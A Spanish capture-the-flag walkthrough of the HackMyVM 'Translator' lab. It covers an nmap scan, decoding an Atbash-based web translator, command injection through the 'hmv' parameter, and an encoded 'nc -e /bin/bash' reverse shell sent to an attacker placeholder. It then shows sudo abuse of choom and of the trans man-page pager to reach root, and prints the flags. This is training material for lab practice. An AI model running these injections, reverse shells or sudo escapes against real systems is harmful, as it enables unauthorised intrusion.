---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Translator HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 03:17 EDT
Nmap scan report for 192.168.5.40
Host is up (0.00051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 08:cf:50:b2:4f:41:43:c4:66:56:ce:96:b9:04:8c:77 (RSA)
|   256 40:b7:11:24:76:59:cd:e0:79:db:71:d1:39:29:d5:45 (ECDSA)
|_  256 44:64:ba:b8:52:4f:ca:00:dd:3e:c3:28:71:6f:77:76 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:38:EC:CC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
```

Veremos que hay un puerto `80` en el que tiene alojada una pagina web, vamos a ver que contiene si entramos, estando dentro veremos una especie de traductor, en el cual si metemos una palabra nos lo traducira de la siguiente forma:

```
hola que tal
```

Info:

```
Translated to:  
sloz jfv gzo sloz jfv gzo
```

Vemos que el tipo de patron que esta utilizando para traducir es `sustitución alfabética invertida` o tambien conocido como `Cifrado Atbash`, lo que hace es invertir el abecedario dependiendo de la letra que pongamos, vamos a montarnos un script de `python3` para traducirlo de mejor forma.

> translate.py

```python
def atbash(texto):
    abecedario = 'abcdefghijklmnopqrstuvwxyz'
    inverso = abecedario[::-1]
    mapa = {original: cifrada for original, cifrada in zip(abecedario, inverso)}

    resultado = ''
    for c in texto.lower():
        if c in mapa:
            resultado += mapa[c]
        else:
            resultado += c  # deja espacios, signos y números sin cambio
    return resultado

# Ejemplo de uso
entrada = input("Texto a cifrar con Atbash: ")
print("Cifrado:", atbash(entrada))
```

Ahora si lo ejecutamos de esta forma:

```shell
python3 translate.py
```

Info:

```
Texto a cifrar con Atbash: id
Cifrado: rw
```

Vemos que se esta traduciendo bien, vamos a probar a meter algo ya traducido, pero para intentar realizar un `RCE` a ver si se pudiera.

Si metemos directamente `rw` que es igual a `id` veremos lo siguiente:

```
Translated to:  
id id
```

Se esta traduciendo bien, pero como que se duplica, vamos a probar varios tipos de concatenacion, a ver si se pudiera concatenar y de alguna forma `bypassear` esto.

```
rw;rw
```

Info:

```
Translated to:  
id;id id uid=33(www-data) gid=33(www-data) groufs=33(www-data)
```

Por lo que vemos efectivamente se esta ejecutando el comando, por lo que vamos a realizarnos una `reverse shell` de esta forma.

```shell
python3 translate.py
```

Info:

```
Texto a cifrar con Atbash: nc -e /bin/bash <IP_ATTACKER> <PORT>
Cifrado: mx -v /yrm/yzhs <IP_ATTACKER> <PORT>
```

Para hacerlo mas facil vamos a utilizar directamente el parametro que utiliza para traducir la pagina llamado `hmv` con `curl`.

```shell
curl 'http://<IP>/translate.php?hmv=a;mx%20-v%20/yrm/yzhs%20<IP_ATTACKER>%20<PORT>'
```

Antes de enviar el comando, nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.40] 52818
whoami
www-data
```

Veremos que ha funcionado, por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user ocean

Si nos vamos a la siguiente ruta bastante interesante:

```shell
cd /var/www/html
```

Veremos lo siguiente:

```
total 20
drwxr-xr-x 2 www-data www-data 4096 May 11  2022 .
drwxr-xr-x 3 root     root     4096 May 11  2022 ..
-rw-r--r-- 1 www-data www-data   24 May 11  2022 hvxivg
-rw-r--r-- 1 www-data www-data  290 May 11  2022 index.html
-rw-r--r-- 1 www-data www-data  258 May 11  2022 translate.php
```

Vemos que hay un archivo que no hemos visto antes llamado `hvxivg` por lo que vamos a leerlo:

```
Mb kzhhdliw rh zbfie3w4
```

Vemos que es una frase codificada por el mismo codificado que estabamos utilizando antes, por lo que vamos a llevarlo a nuestro script a ver como lo traduce.

```shell
python3 translate.py
```

Info:

```
Texto a cifrar con Atbash: Mb kzhhdliw rh zbfie3w4
Cifrado: my password is ayurv3d4
```

Vamos a probar dicha `password` con el usuario `ocean`a ver si funciona.

```shell
su ocean
```

Metemos como contraseña `ayurv3d4` y veremos que somos dicho usuario, por lo que leeremos la `flag`del usuario.

> user.txt

```
a6765hftgnhvugy473f
```

## Escalate user india

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ocean on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ocean may run the following commands on translator:
    (india) NOPASSWD: /usr/bin/choom
```

Vemos que podemos ejecutar el binario `choom` como el usuario `india` por lo que haremos lo siguiente:

```shell
sudo -u india choom -n 0 /bin/bash
```

Info:

```
india@translator:/home/ocean$ whoami
india
```

Con esto veremos que seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for india on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User india may run the following commands on translator:
    (root) NOPASSWD: /usr/local/bin/trans
```

Vemos que podemos ejecutar el binario `trans` como el usuario `root` por lo que haremos lo siguiente.

```shell
sudo /usr/local/bin/trans -h
```

Info:

```
Usage:  trans [OPTIONS] [SOURCES]:[TARGETS] [TEXT]...

Information options:
    -V, -version
        Print version and exit.
    -H, -help
        Print help message and exit.
    -M, -man
        Show man page and exit.
    -T, -reference
        Print reference table of languages and exit.
    -R, -reference-english
        Print reference table of languages (in English names) and exit.
    -L CODES, -list CODES
        Print details of languages and exit.
    -S, -list-engines
        List available translation engines and exit.
    -U, -upgrade
        Check for upgrade of this program.

Translator options:
    -e ENGINE, -engine ENGINE
        Specify the translation engine to use.

Display options:
    -verbose
        Verbose mode. (default)
    -b, -brief
        Brief mode.
    -d, -dictionary
        Dictionary mode.
    -identify
        Language identification.
    -show-original Y/n
        Show original text or not.
    -show-original-phonetics Y/n
        Show phonetic notation of original text or not.
    -show-translation Y/n
        Show translation or not.
    -show-translation-phonetics Y/n
        Show phonetic notation of translation or not.
    -show-prompt-message Y/n
        Show prompt message or not.
    -show-languages Y/n
        Show source and target languages or not.
    -show-original-dictionary y/N
        Show dictionary entry of original text or not.
    -show-dictionary Y/n
        Show dictionary entry of translation or not.
    -show-alternatives Y/n
        Show alternative translations or not.
    -w NUM, -width NUM
        Specify the screen width for padding.
    -indent NUM
        Specify the size of indent (number of spaces).
    -theme FILENAME
        Specify the theme to use.
    -no-theme
        Do not use any other theme than default.
    -no-ansi
        Do not use ANSI escape codes.
    -no-autocorrect
        Do not autocorrect. (if defaulted by the translation engine)
    -no-bidi
        Do not convert bidirectional texts.
    -bidi
        Always convert bidirectional texts.
    -no-warn
        Do not write warning messages to stderr.
    -dump
        Print raw API response instead.

Audio options:
    -p, -play
        Listen to the translation.
    -speak
        Listen to the original text.
    -n VOICE, -narrator VOICE
        Specify the narrator, and listen to the translation.
    -player PROGRAM
        Specify the audio player to use, and listen to the translation.
    -no-play
        Do not listen to the translation.
    -no-translate
        Do not translate anything when using -speak.
    -download-audio
        Download the audio to the current directory.
    -download-audio-as FILENAME
        Download the audio to the specified file.

Terminal paging and browsing options:
    -v, -view
        View the translation in a terminal pager.
    -pager PROGRAM
        Specify the terminal pager to use, and view the translation.
    -no-view, -no-pager
        Do not view the translation in a terminal pager.
    -browser PROGRAM
        Specify the web browser to use.
    -no-browser
        Do not open the web browser.

Networking options:
    -x HOST:PORT, -proxy HOST:PORT
        Use HTTP proxy on given port.
    -u STRING, -user-agent STRING
        Specify the User-Agent to identify as.
    -4, -ipv4, -inet4-only
        Connect only to IPv4 addresses.
    -6, -ipv6, -inet6-only
        Connect only to IPv6 addresses.

Interactive shell options:
    -I, -interactive, -shell
        Start an interactive shell.
    -E, -emacs
        Start the GNU Emacs front-end for an interactive shell.
    -no-rlwrap
        Do not invoke rlwrap when starting an interactive shell.

I/O options:
    -i FILENAME, -input FILENAME
        Specify the input file.
    -o FILENAME, -output FILENAME
        Specify the output file.

Language preference options:
    -l CODE, -hl CODE, -lang CODE
        Specify your home language.
    -s CODES, -sl CODES, -source CODES, -from CODES
        Specify the source language(s), joined by '+'.
    -t CODES, -tl CODES, -target CODES, -to CODES
        Specify the target language(s), joined by '+'.

Text preprocessing options:
    -j, -join-sentence
        Treat all arguments as one single sentence.

Other options:
    -no-init
        Do not load any initialization script.

See the man page trans(1) for more information.
```

En toda esta informacion veremos un parametro bastante interesante que es el siguiente:

```
-M, -man
        Show man page and exit.
```

Como esto se esta ejecutando con `root` podemos aprobechar una vulnerabilidad con el binario `man` que se esta ejecutando si yo pongo el parametro `-M` por lo que vamos a realizar lo siguiente:

```shell
sudo /usr/local/bin/trans -M man
!/bin/bash
```

Info:

```
root@translator:/home/india# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
h87M5364V2343ubvgfy
```
